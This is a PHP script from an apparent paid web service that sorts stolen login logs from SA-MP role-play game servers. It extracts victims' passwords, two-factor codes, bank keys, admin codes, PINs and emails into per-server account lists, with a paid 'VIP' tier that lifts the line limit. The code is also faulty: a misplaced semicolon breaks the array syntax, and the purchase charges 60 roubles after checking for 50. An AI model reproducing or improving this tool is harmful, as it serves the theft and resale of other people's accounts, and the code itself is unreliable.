<?php 
	if($_SERVER['REQUEST_METHOD'] != "POST") exit("Only for AJAX request.");

	include($_SERVER['DOCUMENT_ROOT']."/main/config.php");
	include($_SERVER['DOCUMENT_ROOT']."/main/functions.php");

	if(!checkReCaptchaI($_POST['c'])) exit('Ошибка 404.');

	$user = getUserInfo();

	if(!$user) exit('Вы не авторизованны.');

	if($_POST['method'] == 'buy'){
		if($user['vipSorting'] == 1)
			die('Нельзя приобрести подписку ещё раз!');
		if($user['balance'] < 50)
			die('У вас не хватает 50 рублей.');

		mysqli_query($_MS_ID, "UPDATE `users` SET `balance` = `balance` - 60, `vipSorting` = 1 WHERE `id` = {$user['id']};");
		die('Готово.');
	}

	$str_logi = $_POST['data'];
	if(substr_count($str_logi, "\n") > 2000 && $user['vipSorting'] == 0){
		exit('Нельзя грузить более 2000 строк.');
	}

	preg_match_all('/\[skin: (\d+), lvl: (\d+), money: \$(\d+)\]/', $str_logi, $matches, PREG_OFFSET_CAPTURE);
	for($i = 0;$i < count($matches[0]);$i++){
		$str_logi = str_replace($matches[0][$i][0], "",$str_logi);
	}

	$str_logi = preg_replace('/Nick:\s(\w+)\s\|\sDialog\[(\d+)\]:\s(.*?)\s\|\sServer:\s(.*?)\s(.*?)\s\|\sLVL/','Login: [$1] | Server: $4 [$5] | Info[id: $2]: [$3] |', $str_logi);
	
	$logi_array = new stdClass();
	$logi_array->server = array();
	
	$settings_logi = array(
	"Diamond Role Play" => array(
        "id: 1" => "Пароль:[%s%]",
        "id: 17" => "Пароль:[%s%]",
        "id: 2" => "Google Authenticator:[%s%]",
		"id: 5" => "Код безопасности:[%s%]",
		"id: 6" => "IP Привязка:[%s%]",
		"id: 3" => "IP Привязка:[%s%]",
		"id: 10" => "Почта:[%s%]",
    ),
	"Arizona Role Play" => array(
        "id: 1" => "Пароль:[%s%]",
        "id: 2" => "Пароль:[%s%]",
        "id: 211" => "Код от админки:[%s%]",
        "id: 991" => "Ключ от банка:[%s%]",
		"PIN" => "PIN:[%s%]",
		"id: 160" => "Почта:[%s%]"
    ),
	"Samp-Rp.Ru | Server" => array(
        "id: 1" => "Пароль:[%s%]",
        "id: 2" => "Пароль:[%s%]",
        "id: 90" => "IP Привязка:[%s%]",
        "id: 153" => "Код от админки:[%s%]",
		"id: 21" => "Почта:[%s%]"
    ),
	"Advance Role Play" => array(
        "id: 1" => "Пароль:[%s%]",
        "id: 86" => "Последние 4-е цифры номера телефона:[%s%]",
        "id: 88" => "Google Authenticator или Ключ:[%s%]",
		"PIN" => "PIN:[%s%]",
		"id: 3" => "Почта:[%s%]"
    ),
	"Samp Virtual Life" => array(
        "id: 1" => "Пароль:[%s%]",
        "id: 4831" => "Телефон:[%s%]",
        "id: 4833" => "Код с телефона:[%s%]",
		"PIN" => "PIN:[%s%]",
		"id: 10008" => "Код с почты:[%s%]"
    );
	"Grand Role Play" => array(
        "id: 1" => "Пароль:[%s%]",
        "id: 2" => "Пароль:[%s%]",
		"PIN" => "PIN:[%s%]",
		"id: 3" => "Почта:[%s%]"
    ));

	$server_array = array();
	
	preg_match_all('/\| Server:(\s)(.*?)(\s)\[(.*?)\]/', $str_logi, $matches,PREG_SET_ORDER);
	for($i = 0;$i < count($matches);$i++){
		if(!in_array("" . $matches[$i][4] . " IP:[" . $matches[$i][2] . "]",$server_array)){
			array_push($server_array,"" . $matches[$i][4] . " IP:[" . $matches[$i][2] . "]");
			$count = count($logi_array->server);
			$logi_array->server[$count] = new stdClass();
			$logi_array->server[$count]->Name = $matches[$i][4];
			$logi_array->server[$count]->IP = $matches[$i][2];
			$logi_array->server[$count]->Accounts = array();
			$logi_array->server[$count]->Nicks = array();
			preg_match_all('/Login:\s(.*?)\s+\|\sServer:\s' . $matches[$i][2] . '\s\[(.*?)\]/', $str_logi, $matches_nick,PREG_SET_ORDER);
			for($k = 0;$k < count($matches_nick);$k++)
			{
				if(!in_array($matches_nick[$k][1],$logi_array->server[$count]->Nicks))
					array_push($logi_array->server[$count]->Nicks,$matches_nick[$k][1]);
			}
			for($k = 0;$k < count($logi_array->server[$count]->Nicks);$k++)
			{
				$nick = $logi_array->server[$count]->Nicks[$k];
				$logi_array->server[$count]->Accounts[$k] = new stdClass();
				$logi_array->server[$count]->Accounts[$k]->IsAdd = false;
				$nick = str_replace(array('[',']'),array('\[','\]'),$nick);
				$sdata = "" . $matches[$i][4] . " IP:" . $matches[$i][2] . " | NICK: " . $nick . " |";
				foreach( $settings_logi as $s_key => $s_value ){
					if(strpos($matches[$i][4],$s_key) !== false){
						foreach( $s_value as $key => $value ){
							//var_dump('/Login:\s' . $nick . '\s+\|\sServer:\s' . str_replace('.','\.',$matches[$i][2]) . '\s\[(.*?)\]\s\|\sInfo\[' . $key .'\]:\s(.*?)\s\|/');
							preg_match('/Login:\s' . $nick . '\s+\|\sServer:\s' . str_replace('.','\.',$matches[$i][2]) . '\s\[(.*?)\]\s\|\sInfo\[' . $key .'\]:\s(.*?)\s\|/', $str_logi, $ms,PREG_OFFSET_CAPTURE);
							if(isset($ms[2][0])){
								$pass = $ms[2][0];
								$sdata = $sdata . " " . str_replace("%s%",$pass,$value);
								$logi_array->server[$count]->Accounts[$k]->IsAdd = true;
							}
						}
					}					
				}							
				$logi_array->server[$count]->Accounts[$k]->Data = $sdata;
			}
		}
	}

	$enddata = "";	
	$count = count($logi_array->server);
	for($i = 0; $i < $count; $i++){
		for($k = 0; $k < count($logi_array->server[$i]->Accounts); $k++){
			if($logi_array->server[$i]->Accounts[$k]->IsAdd){
				$enddata = $enddata . str_replace(array('\[','\]','[[',']]'), array('','','[',']'), $logi_array->server[$i]->Accounts[$k]->Data) . "\r\n";
			}
		}
	}
	echo($enddata);
?>